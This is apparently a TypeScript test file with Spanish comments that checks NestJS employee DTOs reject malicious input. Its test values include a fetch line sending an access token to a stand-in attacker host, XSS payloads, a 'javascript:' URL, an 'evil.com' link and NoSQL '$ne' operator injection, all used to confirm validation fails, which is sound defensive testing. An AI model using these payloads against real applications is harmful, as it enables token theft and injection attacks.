import { plainToInstance } from 'class-transformer'
import { validate } from 'class-validator'
import { CreateEmployeeDto } from './create-employee.dto'
import { SaveSignatureDto, UpdateEmployeeDto } from './update-employee.dto'

/** Mismas opciones que el ValidationPipe global. */
async function errors<T extends object>(cls: new () => T, body: object) {
  const dto = plainToInstance(cls, body, { enableImplicitConversion: true })
  const result = await validate(dto, { whitelist: true, forbidNonWhitelisted: true })
  return result.map(e => e.property)
}

// Lo que manda la app en el alta (FormData: todo llega como texto).
const alta = {
  firstName: 'JOSÉ LUIS',
  lastName: 'PÉREZ, QUISPE',
  document: '70024465',
  id: '1234',
  image: '/images/user.png',
  vismaId: 'a1b2-c3',
  fileNumber: '00123',
}

describe('CreateEmployeeDto', () => {
  it('acepta lo que manda la app', async () => {
    expect(await errors(CreateEmployeeDto, alta)).toEqual([])
  })

  it('rechaza codigo en el nombre', async () => {
    const body = {
      ...alta,
      firstName: "fetch('https://servidor-atacante.com?t=' + localStorage.getItem('access_token'))",
    }
    expect(await errors(CreateEmployeeDto, body)).toContain('firstName')
    expect(
      await errors(CreateEmployeeDto, { ...alta, lastName: '<img src=x onerror=alert(1)>' })
    ).toContain('lastName')
  })

  it('rechaza campos que gestiona el servidor', async () => {
    expect(await errors(CreateEmployeeDto, { ...alta, faceDescriptor: [1] })).toContain('faceDescriptor')
    expect(await errors(CreateEmployeeDto, { ...alta, status: 'inactive' })).toContain('status')
  })

  it('rechaza un documento que no es texto ni tiene el formato', async () => {
    expect(await errors(CreateEmployeeDto, { ...alta, document: { $ne: null } })).toContain('document')
    expect(await errors(CreateEmployeeDto, { ...alta, document: '70024465;' })).toContain('document')
  })

  it('la imagen solo puede ser https o una ruta del sitio', async () => {
    expect(await errors(CreateEmployeeDto, { ...alta, image: 'javascript:alert(1)' })).toContain('image')
    expect(await errors(CreateEmployeeDto, { ...alta, image: '//evil.com/x.png' })).toContain('image')
    expect(
      await errors(CreateEmployeeDto, { ...alta, image: 'https://s3.us-east-1.amazonaws.com/b/1-x.png' })
    ).toEqual([])
  })
})

describe('UpdateEmployeeDto', () => {
  it('acepta borrar la firma como lo hace la app', async () => {
    expect(await errors(UpdateEmployeeDto, { id: 1234, signature: '' })).toEqual([])
  })
})

describe('SaveSignatureDto', () => {
  it('exige un id de empleado valido', async () => {
    expect(await errors(SaveSignatureDto, { employeeId: '65f1a2b3c4d5e6f708192a3b' })).toEqual([])
    expect(await errors(SaveSignatureDto, { employeeId: { $ne: null } })).toContain('employeeId')
  })
})
